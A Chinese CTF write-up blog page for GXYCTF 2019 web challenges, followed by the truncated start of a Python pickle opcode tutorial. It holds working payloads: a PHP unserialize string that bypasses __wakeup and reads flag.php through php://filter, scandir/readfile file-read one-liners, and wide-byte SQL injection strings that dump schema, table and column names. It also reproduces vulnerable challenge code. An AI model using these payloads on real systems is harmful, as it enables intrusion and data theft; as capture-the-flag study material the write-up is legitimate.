<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>Warning<span class="tag">&lt;/<span class="name">b</span>&gt;</span>:  session_start(): The session id is too long or contains illegal characters, valid characters are a-z, A-Z, 0-9 and &#x27;-,&#x27; in <span class="tag">&lt;<span class="name">b</span>&gt;</span>/var/www/html/index.php<span class="tag">&lt;/<span class="name">b</span>&gt;</span> on line <span class="tag">&lt;<span class="name">b</span>&gt;</span>2<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>Warning<span class="tag">&lt;/<span class="name">b</span>&gt;</span>:  session_start(): Cannot send session cache limiter - headers already sent (output started at /var/www/html/index.php:2) in <span class="tag">&lt;<span class="name">b</span>&gt;</span>/var/www/html/index.php<span class="tag">&lt;/<span class="name">b</span>&gt;</span> on line <span class="tag">&lt;<span class="name">b</span>&gt;</span>2<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br></pre></td></tr></table></figure>



<p>猜测随机生成一个值放到session里面</p>
<p>php版本5.6可以%00截断</p>
<p>后缀不能以ph结尾</p>
<h2 id="Do-you-know-robot"><a href="#Do-you-know-robot" class="headerlink" title="Do you know robot"></a>Do you know robot</h2><blockquote>
<p>PHP 在反序列化 string 时没有严格按照序列化格式 <code>s:x:&quot;x&quot;; </code>进行处理，没有对 <code>&quot; </code>后面的是否存在 <code>;</code> 进行判断，同时增加了对十六进制形式字符串的处理，这样前后处理的不一致让人很费解，同时由于 PHP 手册中对此没有详细的说明，大部分程序员对此处理过程并不了解，这可能导致其在编码过程中出现疏漏，甚至导致严重的安全问题。</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileReader</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$Filename</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$max_length</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;Filename = <span class="keyword">__DIR__</span> . <span class="string">&quot;/bcm.txt&quot;</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;start = <span class="number">12</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;max_length = <span class="number">72</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;Filename = <span class="keyword">__DIR__</span> . <span class="string">&quot;/fake_f1ag.php&quot;</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;start = <span class="number">10</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;max_length = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$data</span> = file_get_contents(<span class="keyword">$this</span>-&gt;Filename, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="keyword">$this</span>-&gt;start, <span class="keyword">$this</span>-&gt;max_length);</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&#123;|\&#125;/&quot;</span>, <span class="variable">$data</span>))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;you can&#x27;t read flag!&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="variable">$data</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">&quot;/.?f.?l.?a.?g.?/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;hack!&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$exp</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;exp&#x27;</span>];</span><br><span class="line">	<span class="variable">$e</span> = unserialize(<span class="variable">$exp</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$e</span>-&gt;Filename;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$exp</span> = <span class="keyword">new</span> FileReader();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>令属性数量与实际数量不同来绕过<code>__wakeup</code></p>
<p>利用16进制绕过flag的限制</p>
<p><code>O:10:&quot;FileReader&quot;:4:&#123;s:8:&quot;Filename&quot;;S:71:&quot;\70\68\70\3a\2f\2f\66\69\6c\74\65\72\2f\72\65\61\64\3d\63\6f\6e\76\65\72\74\2e\62\61\73\65\36\34\2d\65\6e\63\6f\64\65\2f\72\65\73\6f\75\72\63\65\3d\2f\76\61\72\2f\77\77\77\2f\68\74\6d\6c\2f\66\6c\61\67\2e\70\68\70&quot;;s:5:&quot;start&quot;;i:0;s:10:&quot;max_length&quot;;i:10000;&#125;</code></p>
<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>正则匹配的四<code>$_GET</code>,而传的参数是<code>$_REQUEST</code>,从而绕过</p>
<h2 id="sql1"><a href="#sql1" class="headerlink" title="sql1"></a>sql1</h2><p>union select 设置自己的密码拿到flag</p>
<h2 id="禁止套娃"><a href="#禁止套娃" class="headerlink" title="禁止套娃"></a>禁止套娃</h2><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>和bytectf2019有点类似 <a target="_blank" rel="noopener" href="https://blog.zeddyu.info/2019/09/17/bytectf2019/">https://blog.zeddyu.info/2019/09/17/bytectf2019/</a> </p>
<p><code>var_dump(scandir(chr(time())));</code></p>
<p><code>array(5) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(4) &quot;.git&quot; [3]=&gt; string(8) &quot;flag.php&quot; [4]=&gt; string(9) &quot;index.php&quot; &#125;</code></p>
<p>chr,random_bytes</p>
<p>翻数组相关的函数找到array_rand,但是遗憾的是返回的是键名,如果我们能交换键名和值就可以拿到flag.php了,再找一找发现array_filp</p>
<p>最后的payload</p>
<p><code>var_dump(readfile(array_rand(array_flip(scandir(chr(time()))))));</code></p>
<h3 id="解法二-1"><a href="#解法二-1" class="headerlink" title="解法二"></a>解法二</h3><p><code>readfile(session_id(session_start()))</code></p>
<p>然后<code>PHPSESSID=flag.php</code>读到flag</p>
<h2 id="BabySqliv2-0"><a href="#BabySqliv2-0" class="headerlink" title="BabySqliv2.0"></a>BabySqliv2.0</h2><p>提到中文,宽字节注入绕过引号</p>
<p>过滤select,union,where等</p>
<p><code>a%bf%5c%27+ununionion+seselectlect+1,char(97,100,109,105,110),1%23</code></p>
<p>回显密码</p>
<p><code>a%bf%5c%27+ununionion+seselectlect+1,char(97,100,109,105,110),(SELselectECT+group_concat(schema_name)+FROM+information_schema.schemata)%23</code></p>
<p>数据库:<code>information_schema,web_sqli</code></p>
<p><code>a%bf%5c%27+ununionion+seselectlect+1,char(97,100,109,105,110),(SELselectECT+group_concat(table_name)+FROM+information_schema.tables+WHEwhereRE+TABLE_SCHEMA=database())%23</code></p>
<p>表:<code>f14g,user</code></p>
<p><code>a%bf%5c%27+ununionion+seselectlect+1,char(97,100,109,105,110),(SELselectECT+group_concat(column_name)+FROM+information_schema.columns+WHwhereERE+table_name=char(102,49,52,103))%23</code></p>
<p>列:<code>b80bb7740288fda1f201890375a60c8f,327a6c4304ad5938eaf0efb6cc3e53dc</code></p>
<p>读取flag,但是有长度限制</p>
<p>最后得到抖肩舞+flag</p>
<p>GXY{g0Od_job1im_so_vegetable}</p>
<h2 id="babysqliv3-0"><a href="#babysqliv3-0" class="headerlink" title="babysqliv3.0"></a>babysqliv3.0</h2><p>对phpsession注入报错</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>Warning<span class="tag">&lt;/<span class="name">b</span>&gt;</span>:  session_start(): The session id is too long or contains illegal characters, valid characters are a-z, A-Z, 0-9 and &#x27;-,&#x27; in <span class="tag">&lt;<span class="name">b</span>&gt;</span>/var/www/html/search.php<span class="tag">&lt;/<span class="name">b</span>&gt;</span> on line <span class="tag">&lt;<span class="name">b</span>&gt;</span>2<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>Warning<span class="tag">&lt;/<span class="name">b</span>&gt;</span>:  session_start(): Cannot send session cache limiter - headers already sent (output started at /var/www/html/search.php:2) in <span class="tag">&lt;<span class="name">b</span>&gt;</span>/var/www/html/search.php<span class="tag">&lt;/<span class="name">b</span>&gt;</span> on line <span class="tag">&lt;<span class="name">b</span>&gt;</span>2<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=uft-8&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>login<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&#x27;Wrong pass&#x27;</span>);location.href=<span class="string">&#x27;./index.php&#x27;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>Warning<span class="tag">&lt;/<span class="name">b</span>&gt;</span>:  Unknown: The session id is too long or contains illegal characters, valid characters are a-z, A-Z, 0-9 and &#x27;-,&#x27; in <span class="tag">&lt;<span class="name">b</span>&gt;</span>Unknown<span class="tag">&lt;/<span class="name">b</span>&gt;</span> on line <span class="tag">&lt;<span class="name">b</span>&gt;</span>0<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>Warning<span class="tag">&lt;/<span class="name">b</span>&gt;</span>:  Unknown: Failed to write session data (files). Please verify that the current setting of session.save_path is correct () in <span class="tag">&lt;<span class="name">b</span>&gt;</span>Unknown<span class="tag">&lt;/<span class="name">b</span>&gt;</span> on line <span class="tag">&lt;<span class="name">b</span>&gt;</span>0<span class="tag">&lt;/<span class="name">b</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[21:19:28] 200 -   89B  - /home.php</span><br><span class="line">[21:19:29] 200 -  562B  - /index.php</span><br><span class="line">[21:19:35] 200 -  253B  - /upload.php</span><br><span class="line">[21:19:35] 301 -  327B  - /uploads  -&gt;  http://183.129.189.60:10023/uploads/</span><br><span class="line">[21:19:35] 403 -  300B  - /uploads/</span><br></pre></td></tr></table></figure>

<p>fuzz一下发现没啥好注的</p>
<p>再结合扫到的东东,爆破得到密码password</p>
<p>文件上传没用?上传后没有任何提示</p>
<p>content-type改为jpeg,可以上传但是后缀是.txt</p>
<p>如果能控制后缀就可以文件包含了尝试文件名处%00截断无效</p>
<p>home处有文件包含,但是会再末尾添加.fxxkyou(home.php和upload.php不会)</p>
<p>因为题目环境是5.6,尝试%00截断 [ x ]</p>
<p>这里我发现我对文件上传和文件包含部分的掌握不好,以及思考解决方法时候的思考方式不太行</p>
<p>这里利用伪协议直接读取代码,但是我却偏偏没想到这么基础的东西.回去重新学习一下文件包含和上传</p>
<p>代码审计发现phar反序列化可以命令执行</p>
<p>已被魔改</p>
<p>home.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;meta http-equiv=\&quot;Content-Type\&quot; content=\&quot;text/html; charset=utf-8\&quot; /&gt; &lt;title&gt;Home&lt;/title&gt;&quot;</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.?f.?l.?a.?g.?/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/home$/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) <span class="keyword">or</span> preg_match(<span class="string">&quot;/upload$/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.fxxkyou!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;当前引用 &quot;</span>.<span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">require</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no permission!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>upload.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt; </span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">	上传</span><br><span class="line">	&lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">	&lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$Filename</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$sandbox</span> = getcwd().<span class="string">&quot;/uploads/&quot;</span>.md5(<span class="string">&quot;admin&quot;</span>).<span class="string">&quot;/&quot;</span>;</span><br><span class="line">		<span class="variable">$ext</span> = <span class="string">&quot;.txt&quot;</span>;</span><br><span class="line">		@mkdir(<span class="variable">$sandbox</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) <span class="keyword">and</span> !preg_match(<span class="string">&quot;/data:\/\/ | filter:\/\/ | php:\/\/ | \./i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;Filename = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;Filename = <span class="variable">$sandbox</span>.<span class="string">&quot;admin&quot;</span>.<span class="variable">$ext</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;echo &#x27;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#x27;;&quot;</span>;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;token = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">global</span> <span class="variable">$sandbox</span>;</span><br><span class="line">		<span class="keyword">global</span> <span class="variable">$ext</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&quot;[^a-z0-9]&quot;</span>, <span class="keyword">$this</span>-&gt;Filename))&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;illegal filename!&#x27;);&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">1024</span>)&#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;you are too big ( :) )&#x27;);&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;move_uploaded_file(&#x27;&quot;</span>.<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>].<span class="string">&quot;&#x27;, &#x27;&quot;</span> . <span class="keyword">$this</span>-&gt;Filename . <span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">global</span> <span class="variable">$sandbox</span>;</span><br><span class="line">		<span class="keyword">global</span> <span class="variable">$ext</span>;</span><br><span class="line">		<span class="comment">// return $sandbox.$this-&gt;Filename.$ext;</span></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;Filename;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token != <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;cmd = <span class="string">&quot;die(&#x27;check token falied!&#x27;);&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__destruct&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$uploader</span> = <span class="keyword">new</span> Uploader();</span><br><span class="line">	<span class="variable">$uploader</span>-&gt;upload(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">	<span class="keyword">if</span>(@file_get_contents(<span class="variable">$uploader</span>))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;成功上传&lt;br&gt;&quot;</span>.<span class="variable">$uploader</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">		<span class="keyword">echo</span> file_get_contents(<span class="variable">$uploader</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="参考-其他人的wp"><a href="#参考-其他人的wp" class="headerlink" title="参考(其他人的wp)"></a>参考(其他人的wp)</h2><ol>
<li> <a target="_blank" rel="noopener" href="http://www.qfrost.com/PWN/GXY_CTF/">http://www.qfrost.com/PWN/GXY_CTF/</a> </li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2019/12/26/gxyctf2019/" data-id="cku8k8fxy004id0obht9jclvq" data-title="gxytf2019" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">线上赛</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-pickle" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/12/26/pickle/" class="article-date">
  <time class="dt-published" datetime="2019-12-26T16:00:00.000Z" itemprop="datePublished">2019-12-27</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/12/26/pickle/">python  pickle 入门</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="python-pickle"><a href="#python-pickle" class="headerlink" title="python pickle"></a>python pickle</h1><h2 id="推荐文章"><a href="#推荐文章" class="headerlink" title="推荐文章"></a>推荐文章</h2><p> <a target="_blank" rel="noopener" href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a> </p>
<p>z牛: <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/188981">https://www.anquanke.com/post/id/188981</a> </p>
<h2 id="pickle操作码大全-v0"><a href="#pickle操作码大全-v0" class="headerlink" title="pickle操作码大全(v0)"></a>pickle操作码大全(v0)</h2><p>有啥不懂的直接看源码把(z牛)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">MARK           = <span class="string">b&#x27;(&#x27;</span>   <span class="comment"># push special markobject on stack</span></span><br><span class="line">STOP           = <span class="string">b&#x27;.&#x27;</span>   <span class="comment"># every pickle ends with STOP</span></span><br><span class="line">POP            = <span class="string">b&#x27;0&#x27;</span>   <span class="comment"># discard topmost stack item</span></span><br><span class="line">POP_MARK       = <span class="string">b&#x27;1&#x27;</span>   <span class="comment"># discard stack top through topmost markobject</span></span><br><span class="line">DUP            = <span class="string">b&#x27;2&#x27;</span>   <span class="comment"># duplicate top stack item</span></span><br><span class="line">FLOAT          = <span class="string">b&#x27;F&#x27;</span>   <span 